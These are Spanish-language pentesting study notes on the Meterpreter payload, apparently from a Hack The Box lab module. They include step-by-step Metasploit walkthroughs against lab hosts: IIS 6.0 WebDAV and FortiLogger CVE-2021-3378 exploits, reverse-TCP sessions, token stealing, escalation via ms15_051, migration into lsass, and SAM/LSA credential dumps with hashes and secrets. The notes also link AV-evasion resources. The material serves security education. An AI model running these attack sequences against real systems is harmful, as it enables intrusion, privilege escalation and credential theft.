# Meterpreter

## Introducción al Payload Meterpreter

Meterpreter es un payload avanzado y multifacético que representa una de las herramientas más sofisticadas dentro del arsenal de Metasploit Framework. Su diseño único lo distingue de payloads convencionales mediante características técnicas específicas:

### Características Técnicas Fundamentales

**1. Inyección DLL (Dynamic Link Library Injection)**

Meterpreter utiliza inyección de DLL para establecer su presencia en el sistema objetivo. Este método permite que el payload se integre dentro de procesos legítimos ya en ejecución, dificultando su detección mediante inspecciones básicas del sistema.

**2. Estabilidad de Conexión**

El canal de comunicación establecido por Meterpreter está diseñado para ser robusto y resistente a interrupciones temporales de red. Además, puede configurarse para persistir a través de:
- Reinicios del sistema
- Cambios en la configuración del sistema
- Migraciones entre procesos

**3. Residencia en Memoria**

Una vez ejecutado, Meterpreter reside **completamente en la memoria RAM** del host remoto. Esta característica crítica significa:
- No se escriben archivos en el disco duro
- No se crean entradas en el registro permanentes durante la ejecución normal
- Detección mediante técnicas forenses convencionales basadas en disco es extremadamente difícil

La ausencia de artefactos en disco hace que Meterpreter sea prácticamente invisible para análisis forenses tradicionales que se enfocan en escanear el sistema de archivos.

### Apodo: "La Navaja Suiza del Pentesting"

Meterpreter ha ganado esta reputación debido a su versatilidad y amplitud de funcionalidades. Su propósito principal es **mejorar procedimientos de post-explotación**, ofreciendo un conjunto curado de herramientas relevantes para:

- **Enumeración interna**: Reconocimiento del sistema objetivo desde dentro
- **Escalación de privilegios**: Identificación y explotación de vectores para elevar permisos
- **Evasión de AV**: Técnicas para evitar detección por antivirus
- **Investigación de vulnerabilidades**: Búsqueda de debilidades adicionales en el sistema
- **Acceso persistente**: Establecimiento de backdoors y mecanismos de reentrada
- **Pivoting**: Uso del sistema comprometido como punto de salto hacia otros objetivos en la red

### Recursos Adicionales

Para profundizar en aspectos avanzados de Meterpreter:

- [Meterpreter Stageless Payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/) - Análisis de payloads sin staging
- [Modifying Metasploit Templates for Evasion](https://www.rapid7.com/blog/post/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/)
- [Técnicas de modificación de templates para evasión](https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion/)

*Nota: Estos temas están fuera del alcance de este módulo pero representan posibilidades importantes para operaciones avanzadas.*

## Ejecutando Meterpreter

### Selección del Payload

Para ejecutar Meterpreter, seleccionamos cualquier versión del payload desde la salida de `show payloads`, considerando:

- **Tipo de conexión**: reverse, bind, etc.
- **Sistema operativo objetivo**: Windows, Linux, macOS, Android, etc.
- **Arquitectura**: x86, x64, ARM

### Proceso de Inicialización de Meterpreter

Cuando el exploit se completa exitosamente, ocurre la siguiente secuencia de eventos:

**1. Ejecución del Stager Inicial**

El objetivo ejecuta el stager, que típicamente es uno de los siguientes tipos:
- **bind**: Escucha en un puerto del objetivo esperando conexión del atacante
- **reverse**: Se conecta de vuelta al atacante
- **findtag**: Busca un socket específico basado en tag
- **passivex**: Utiliza controles ActiveX

**2. Carga del DLL Reflective**

El stager carga la DLL con prefijo "Reflective". El **Reflective stub** maneja:
- La carga de la DLL directamente en memoria
- La inyección en el espacio de direcciones del proceso
- La resolución de direcciones de funciones necesarias

Esta técnica, conocida como **Reflective DLL Injection**, permite cargar una biblioteca sin usar las APIs estándar de Windows como `LoadLibrary`, evitando así registros en estructuras del sistema operativo.

**3. Inicialización del Core de Meterpreter**

El núcleo de Meterpreter se inicializa y:
- Establece un enlace cifrado con **AES (Advanced Encryption Standard)**
- Envía una petición **GET** inicial
- Metasploit recibe este GET y configura el cliente

La comunicación cifrada con AES garantiza:
- **Confidencialidad**: El tráfico no puede ser leído por terceros
- **Integridad**: Detección de modificaciones al tráfico en tránsito

**4. Carga de Extensiones**

Meterpreter carga extensiones automáticamente:
- **stdapi**: Siempre se carga (funcionalidad estándar del sistema)
- **priv**: Se carga si el módulo proporciona derechos administrativos

Todas estas extensiones se cargan sobre el canal cifrado con AES, manteniendo la operación segura.

## Comandos de Meterpreter

Una vez establecido el shell de Meterpreter, podemos ejecutar `help` para ver capacidades disponibles:

```
meterpreter > help
```

### Core Commands (Comandos Principales)

```
Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel
```

**Comandos destacados:**

- **migrate**: Permite migrar el servidor Meterpreter a otro proceso, crítico para estabilidad y evasión
- **channel**: Sistema de canales que permite múltiples comunicaciones simultáneas
- **irb/pry**: Acceso a shells de Ruby para scripting avanzado
- **sleep**: Modo silencioso que suspende comunicaciones y las restablece después

Algunos de estos comandos están disponibles en el [module cheat sheet](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) para referencia rápida.

## Objetivos de Diseño de Meterpreter

Los desarrolladores establecieron tres pilares fundamentales para el proyecto:

### 1. Stealthy (Sigiloso)

**Residencia en Memoria**

Meterpreter, una vez lanzado y operativo en el objetivo, **reside completamente en memoria**:
- No escribe nada al disco durante operación normal
- No deja artefactos forenses en el sistema de archivos
- Desaparece completamente al reiniciar (a menos que se configure persistencia)

**Sin Creación de Procesos**

No se crean procesos nuevos. En su lugar, Meterpreter:
- Se inyecta en un proceso comprometido existente
- Opera desde dentro del espacio de memoria de ese proceso
- Aparece como parte del proceso legítimo en listados de procesos

**Migración de Procesos**

Puede realizar migraciones entre procesos en ejecución:
- Si el proceso actual está en riesgo de terminación
- Para moverse a un proceso más estable (ej: `explorer.exe`, `svchost.exe`)
- Para obtener diferentes niveles de privilegio

**Cifrado AES en Comunicaciones**

Con `msfconsole-v6` actualizado, todas las comunicaciones Meterpreter entre el host objetivo y el atacante están cifradas con **AES (Advanced Encryption Standard)**:
- Confidencialidad de datos
- Integridad de comunicaciones
- Dificulta análisis de tráfico de red

**Resultado**: Evidencia forense limitada y mínimo impacto en la máquina víctima.

### 2. Powerful (Poderoso)

**Sistema de Comunicación Canalizada**

Meterpreter utiliza un sistema de **comunicación canalizada** (channelized communication) entre el host objetivo y el atacante. Este diseño permite:

**Múltiples canales simultáneos**: Podemos abrir varios canales de comunicación independientes sobre una sola sesión:
- Un canal para shell del sistema operativo
- Otro canal para transferencia de archivos
- Canal adicional para ejecución de módulos post-explotación

**Ejemplo práctico**: Inmediatamente después de obtener una sesión Meterpreter, podemos spawear un shell del SO objetivo:

```
meterpreter > shell
```

Esto abre un **canal dedicado** para el shell, permitiendo que continúen otras operaciones Meterpreter en paralelo sin interferencia.

**Tráfico cifrado en todos los canales**: Cada canal se beneficia del cifrado AES, asegurando que toda la comunicación permanezca protegida.

### 3. Extensible

**Aumento de Funcionalidades en Runtime**

Las características de Meterpreter pueden **aumentarse en tiempo de ejecución** sin necesidad de recompilar o reiniciar:
- Cargar extensiones bajo demanda
- Agregar nuevas capacidades sobre la marcha
- Adaptarse a necesidades específicas del objetivo

**Carga sobre la Red**

Las extensiones se cargan directamente sobre la red:
- No requieren estar pre-instaladas en el objetivo
- Se transfieren de forma cifrada
- Se cargan directamente en memoria

**Estructura Modular**

La arquitectura modular permite:
- Agregar nueva funcionalidad sin reconstruir el core
- Mantener el tamaño del payload inicial pequeño
- Extender capacidades según necesidades específicas

## Caso Práctico: Explotación Completa con Meterpreter

### Fase 1: Reconocimiento Inicial

Ejecutamos un escaneo completo usando `db_nmap` para aprovechar el tracking automático de datos:

```
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15
```

**Salida:**
```
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 09:55 UTC
[*] Nmap: Nmap scan report for 10.10.10.15
[*] Nmap: Host is up (0.021s latency).
[*] Nmap: Not shown: 65534 filtered ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0
[*] Nmap: | http-methods:
[*] Nmap: |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
[*] Nmap: |_http-server-header: Microsoft-IIS/6.0
[*] Nmap: |_http-title: Under Construction
[*] Nmap: | http-webdav-scan:
[*] Nmap: |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
[*] Nmap: |   WebDAV type: Unknown
[*] Nmap: |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
[*] Nmap: |   Server Date: Thu, 03 Sep 2020 09:56:46 GMT
[*] Nmap: |_  Server Type: Microsoft-IIS/6.0
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Hallazgos clave:**
- Puerto 80 abierto con **Microsoft IIS httpd 6.0**
- Métodos HTTP potencialmente peligrosos habilitados
- **WebDAV** habilitado

### Verificación de Base de Datos

```
msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.15             Unknown                    device         
```

```
msf6 > services

Services
========

host         port  proto  name  state  info
----         ----  -----  ----  -----  ----
10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0
```

La información se registra automáticamente en la base de datos de Metasploit.

### Análisis del Servicio Web

Al visitar `http://10.10.10.15:80`, encontramos una página "Under Construction" sin contenido aparente. Sin embargo, la versión específica del servidor (**IIS 6.0**) es un dato crítico.

### Investigación de Vulnerabilidades

Investigando vulnerabilidades conocidas para IIS 6.0, identificamos:
- **CVE-2017-7269**: Vulnerabilidad crítica de ejecución remota de código
- Existe módulo de Metasploit para esta vulnerabilidad

### Fase 2: Selección y Configuración del Exploit

```
msf6 > search iis_webdav_upload_asp

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution
```

```
msf6 > use 0

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

**Nota importante**: Metasploit selecciona automáticamente `windows/meterpreter/reverse_tcp` como payload por defecto cuando es apropiado.

### Revisión de Opciones

```
msf6 exploit(windows/iis/iis_webdav_upload_asp) > show options

Module options (exploit/windows/iis/iis_webdav_upload_asp):

   Name          Current Setting        Required  Description
   ----          ---------------        --------  -----------
   HttpPassword                         no        The HTTP password to specify for authentication
   HttpUsername                         no        The HTTP username to specify for authentication
   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp
   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                               yes       The target host(s), range CIDR identifier, or hosts file
   RPORT         80                     yes       The target port (TCP)
   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
   VHOST                                no        HTTP server virtual host

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique
   LHOST     10.10.239.181    yes       The listen address
   LPORT     4444             yes       The listen port
```

### Configuración y Ejecución

```
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
RHOST => 10.10.10.15

msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0
LHOST => tun0

msf6 exploit(windows/iis/iis_webdav_upload_asp) > run
```

**Salida:**
```
[*] Started reverse TCP handler on 10.10.14.26:4444 
[*] Checking /metasploit28857905.asp
[*] Uploading 612435 bytes to /metasploit28857905.txt...
[*] Moving /metasploit28857905.txt to /metasploit28857905.asp...
[*] Executing /metasploit28857905.asp...
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Deleting /metasploit28857905.asp (this doesn't always work)...
[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]
[*] Meterpreter session 1 opened (10.10.14.26:4444 -> 10.10.10.15:1030) at 2020-09-03 10:10:21 +0000

meterpreter >
```

### Análisis Crítico: Artefactos en Disco

**Problema identificado**: El archivo `metasploit28857905.asp` permanece en el sistema objetivo.

**Por qué es un problema:**

1. **Evidencia forense**: Rastro claro de la intrusión
2. **Detección por IDS/IPS**: Patrones de nombre predecibles (`metasploit[número].asp`)
3. **Responsabilidad del atacante**: Artefactos no limpiados

**Contramedida defensiva**: Los administradores pueden implementar:
- **Detección basada en regex**: Buscar patrones `metasploit\d+\.(asp|aspx|php)`
- **Monitoreo de WebDAV**: Alertas sobre uploads inusuales
- **Signatures específicas**: Firmas basadas en contenido del payload

Una configuración de seguridad correcta que detecte estos patrones puede **prevenir el spawn del shell Meterpreter** antes de que el atacante gane acceso.

### Fase 3: Enumeración Inicial y Migración de Proceso

**Intento de identificar usuario:**

```
meterpreter > getuid

[-] 1055: Operation failed: Access is denied.
```

El comando falla, indicando restricciones de permisos en el contexto actual.

**Listado de procesos:**

```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 216   1080  cidaemon.exe                                                    
 272   4     smss.exe                                                        
 292   1080  cidaemon.exe                                                    
<...SNIP...>

 1712  396   alg.exe                                                         
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe                                                     
 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
 2312  592   wmiprvse.exe                                                    
 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 4076  1080  cidaemon.exe
```

**Robo de token (Token Stealing):**

```
meterpreter > steal_token 1836

Stolen token with username: NT AUTHORITY\NETWORK SERVICE

meterpreter > getuid

Server username: NT AUTHORITY\NETWORK SERVICE
```

Ahora operamos bajo el contexto `NT AUTHORITY\NETWORK SERVICE`, que proporciona permisos básicos de red pero aún no es administrador.

### Fase 4: Exploración del Sistema

```
c:\Inetpub>dir

 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of c:\Inetpub

04/12/2017  05:17 PM    <DIR>          .
04/12/2017  05:17 PM    <DIR>          ..
04/12/2017  05:16 PM    <DIR>          AdminScripts
09/03/2020  01:10 PM    <DIR>          wwwroot
               0 File(s)              0 bytes
               4 Dir(s)  18,125,160,448 bytes free

c:\Inetpub>cd AdminScripts
Access is denied.
```

Encontramos el directorio `AdminScripts` pero nuestros permisos actuales no permiten acceso.

### Fase 5: Escalación de Privilegios con Local Exploit Suggester

**Background de la sesión:**

```
meterpreter > bg

Background session 1? [y/N]  y
```

**Búsqueda y uso del módulo:**

```
msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester

msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1

msf6 post(multi/recon/local_exploit_suggester) > run
```

**Resultados:**
```
[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 34 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

El módulo identifica **6 vulnerabilidades locales potenciales** para escalación de privilegios.

### Fase 6: Explotación de Vulnerabilidad Local

**Selección del exploit:**

```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

**Configuración:**

```
msf6 exploit(windows/local/ms15_051_client_copy_image) > show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique
   LHOST     46.101.239.181   yes       The listen address
   LPORT     4444             yes       The listen port

msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
session => 1

msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0
LHOST => tun0

msf6 exploit(windows/local/ms15_051_client_copy_image) > run
```

**Ejecución:**
```
[*] Started reverse TCP handler on 10.10.14.26:4444 
[*] Launching notepad to host the exploit...
[+] Process 844 launched.
[*] Reflectively injecting the exploit DLL into 844...
[*] Injecting exploit into 844...
[*] Exploit injected. Injecting payload into 844...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

**¡Éxito!** Ahora tenemos privilegios de `NT AUTHORITY\SYSTEM` (equivalente a root en Windows).

### Fase 7: Post-Explotación - Extracción de Credenciales

**Dump de hashes con hashdump:**

```
meterpreter > hashdump

Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::
```

**Formato de salida:**
```
Username:RID:LM_Hash:NTLM_Hash:::
```

**Dump completo de SAM:**

```
meterpreter > lsa_dump_sam

[+] Running as SYSTEM
[*] Dumping SAM
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
Local SID : S-1-5-21-1709780765-3897210020-3926566182

SAMKey : 37ceb48682ea1b0197c7ab294ec405fe

RID  : 000001f4 (500)
User : Administrator
  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf
  Hash NTLM: d6908f022af0373e9e21b8a241c86dca

RID  : 000001f5 (501)
User : Guest

RID  : 000003e9 (1001)
User : SUPPORT_388945a0
  Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6

RID  : 000003eb (1003)
User : IUSR_GRANPA
  Hash LM  : a274b4532c9ca5cdf684351fab962e86
  Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88

RID  : 000003ec (1004)
User : IWAM_GRANPA
  Hash LM  : 95d112c4da2348b599183ac6b1d67840
  Hash NTLM: a97f39734c21b3f6155ded7821d04d16

RID  : 000003ef (1007)
User : ASPNET
  Hash LM  : 3f71d62ec68a06a39721cb3f54f04a3b
  Hash NTLM: edc0d5506804653f58964a2376bbd769

RID  : 000003f1 (1009)
User : Lakis
  Hash LM  : f927b0679b3cc0e192410d9b0b40873c
  Hash NTLM: 3064b6fc432033870c6730228af7867c
```

**Información adicional obtenida:**
- **Domain**: GRANNY
- **SysKey**: Clave de cifrado del SAM
- **Local SID**: Identificador de seguridad único del sistema
- **SAMKey**: Clave de cifrado específica

**Dump de secretos LSA:**

```
meterpreter > lsa_dump_secrets

[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb

Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )
Domain name : HTB

Policy subsystem is : 1.7
LSA Key : ada60ee248094ce782807afae1711b2c

Secret  : aspnet_WP_PASSWORD
cur/text: Q5C'181g16D'=F

Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV
cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63 
    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63
    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63
```

*[Salida truncada - contiene múltiples secretos adicionales]*

**Secretos extraídos incluyen:**
- **aspnet_WP_PASSWORD**: Contraseña en texto claro del worker process de ASP.NET
- **DPAPI_SYSTEM**: Claves maestras de DPAPI (Data Protection API)
- **Configuraciones de servicios**: Credenciales de servicios de Windows
- **Claves de cifrado**: Múltiples claves utilizadas por el sistema

### Fase 8: Movimiento Lateral (Pivoting)

Con las credenciales obtenidas, si este sistema estuviera conectado a una red corporativa más extensa, podríamos:

1. **Usar hashes para Pass-the-Hash**: Autenticarnos en otros sistemas sin necesidad de crackear passwords
2. **Impersonar usuarios con mayor privilegio**: Usar tokens robados de usuarios de dominio
3. **Acceder a recursos internos**: Compartidos de red, bases de datos, aplicaciones internas
4. **Pivotear a través del sistema**: Usar este host comprometido como punto de salto hacia objetivos más profundos en la red

**Ejemplo de pivoting**: Si la postura de seguridad general de la red es débil, estos hashes y credenciales pueden abrir puertas hacia:
- Controladores de dominio
- Servidores de base de datos
- Infraestructura crítica de negocio

---

## Referencias

- [Meterpreter Stageless Payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)
- [Modifying Metasploit Templates for Evasion](https://www.rapid7.com/blog/post/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/)
- [Meterpreter Basics - Offensive Security](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)

## Conclusión

Meterpreter representa la culminación de años de desarrollo enfocado en crear la herramienta de post-explotación definitiva. Su combinación de sigilo, poder y extensibilidad lo convierte en el payload preferido para operaciones de pentesting profesional. El caso práctico demuestra el flujo completo desde reconocimiento inicial hasta compromiso total del sistema, ilustrando por qué Meterpreter merece su reputación como la "navaja suiza del pentesting".


---

# Preguntas

#### Encuentra el exploit existente en MSF y úsalo para obtener acceso al sistema objetivo. ¿Cuál es el nombre de usuario del usuario con el que obtuviste acceso?

Enviamos una traza `ICMP` para verificar que el objetivo se encuentra activo:
<img width="860" height="210" alt="image" src="https://github.com/user-attachments/assets/01b600f0-7601-4c9c-b559-135ffc490845" />

Iniciamos la base de datos de metasploit y corremos msfconsole con `msfdb run`. Luego limpiamos nuestro workspace `lab`:

```bash
workspace -d lab
workspace -a lab
```

Luego hacemos un escaneo sn con nmap:
<img width="1054" height="135" alt="image" src="https://github.com/user-attachments/assets/f5cc6220-468e-40c3-b433-6e779b3008fa" />

Hacemos un escaneo `TCP SYN`:
```bash
db_nmap -Pn -n --disable-arp-ping --reason -sS <ip>
```

<img width="1084" height="335" alt="image" src="https://github.com/user-attachments/assets/3b4b911f-5849-4238-b18c-2e040fa1775b" />

Hacemos un escaneo de versiones con un conjunto de scripts NSE predefinidos, a su vez la categoría de scripts `vuln` y un reconocimiento de sitema operativo:
```bash
db_nmap --reason -p135,445,3389,5000,5985 -sV -sC --script=vuln -O <ip>
```
<img width="1261" height="784" alt="image" src="https://github.com/user-attachments/assets/f14f8880-d0cf-4e07-92fe-159ec394532e" />

<img width="1496" height="429" alt="image" src="https://github.com/user-attachments/assets/6a2845cb-c02e-4c78-86d9-cd346091b74d" />

También podríamos haber hecho como en el material:
```bash
db_nmap -sV -p- -T5 -A <ip>
```
No vemos a priori stack deliberadamente vulnerable.. lo que sí tenemos es el nombre `FortiLogger` en el `http-title`.


Procedemos a inspeccionar un poco más el sitio http..
<img width="1474" height="664" alt="image" src="https://github.com/user-attachments/assets/b7f1b8d0-5930-415b-b1a2-8bb005f09aab" />

Vemos que tenemos acceso con credenciales `admin`:`admin`

<img width="1908" height="856" alt="image" src="https://github.com/user-attachments/assets/503b3812-d28e-49e4-8071-235d581c27fa" />

Haciendo click en el ícono de información obtenemos un popup con la versión exacta de `FortiLogger`:

<img width="838" height="316" alt="image" src="https://github.com/user-attachments/assets/90725aa6-6b28-4b53-9343-fc60c96a29c5" />

Versión: `FortiLogger 4.4.2.2`

Buscamos en searchsploit vulnerabilidades para esa versión:
<img width="1915" height="190" alt="image" src="https://github.com/user-attachments/assets/1d00d498-b6e5-4623-82af-179a5cf109dc" />

Obtenemos un exploit que existe en `Metasploit` .. `Unauthenticated Arbitrary File Upload`.

Si leemos el exploit, vemos que se trata del [CVE-2021-3378](erberkan.github.io/2021/cve-2021-3378/). 


En metasploit buscamos por cve:
```
search cve:2021-3378 type:exploit
```
<img width="1746" height="358" alt="image" src="https://github.com/user-attachments/assets/be8243de-71c6-4dbc-9ea2-b56f68a60895" />

```bash
use 0
options
hosts -R
set LHOST tun0
check
exploit
```

<img width="1339" height="289" alt="image" src="https://github.com/user-attachments/assets/b6f1ec12-47e4-42a8-a79a-2ea919b4d42c" />

Obtenemos el usuario:
<img width="570" height="59" alt="image" src="https://github.com/user-attachments/assets/144453d0-1fcb-43c3-b177-eb6ef6e1af2a" />


#### Obtenga el hash de la contraseña NTLM del usuario "htb-student". Envíe el hash como respuesta.

Como ya tenemos meterpreter, vamos a correr `lsa_dump_sam`, primero tenemos que cargar `kiwi`:

```bash
load kiwi
lsa_dump_sam
```

<img width="1261" height="736" alt="image" src="https://github.com/user-attachments/assets/c4e0d3e0-8c8b-4afc-b053-272408f298b8" />


<img width="873" height="208" alt="image" src="https://github.com/user-attachments/assets/5eb42c02-f4cf-4821-bb5d-fc46f97b52c7" />

---

`Nota`: Si queremos hacer `hashdump` no podemos porque nos dice `priv_passwd_get_sam_hashes`:
<img width="994" height="115" alt="image" src="https://github.com/user-attachments/assets/50d975f1-9db0-40ea-901b-0e7c024b72a1" />

Si observamos los procesos con `ps`, podemos encontrar el proceso mediante el cual corre meterpreter:
<img width="1828" height="824" alt="image" src="https://github.com/user-attachments/assets/a5727872-4ab4-4b3e-a65d-29682a81ccf8" />


Probablemente tengamos que migrar a un proceso con permisos sobre la SAM, podríamos utilizar `lsass`:
<img width="1653" height="834" alt="image" src="https://github.com/user-attachments/assets/c9076da6-50db-4ce5-9d7d-d9c6493d32f8" />

Migramos a `lsass` con el comando `migrate 640` y luego realizamos el comando `hashdump`:
<img width="1159" height="275" alt="image" src="https://github.com/user-attachments/assets/23040909-05f2-4d69-b690-7d1eac07efaf" />
